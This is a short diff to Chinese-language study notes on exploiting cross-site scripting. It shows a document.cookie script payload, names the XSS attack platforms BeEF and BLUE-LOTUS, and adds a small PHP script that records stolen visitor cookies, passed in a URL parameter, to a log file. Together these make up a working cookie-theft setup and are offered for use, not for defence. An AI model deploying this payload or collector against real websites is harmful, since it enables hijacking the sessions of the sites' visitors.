@@ -1,6 +1,7 @@
 漏洞利用
 XSS注入在线脚本危害：
 通过脚本获取访问者信息，访问者的cookie，操作用户客户端等操作。
+```
 <script>alert(document.cookie)</script>
 
 1. kali中的beef (apt search beef-xss)
@@ -10,3 +11,13 @@ XSS注入在线脚本危害：
 2. BLUE-LOTUS
     用网站搭建一个蓝恋花xss后台管理平台
 3. 其他XSS测试平台
+
+4.自建脚本，如：
+<?php
+	$cookie = $_GET['cookie'];
+	$time = date('Y-m-d h:i:s', time());
+	$log = fopen("cookie.txt", "a");
+	fwrite($log,$time.':    '. $cookie . "\n");
+	fclose($log);
+?>
+```
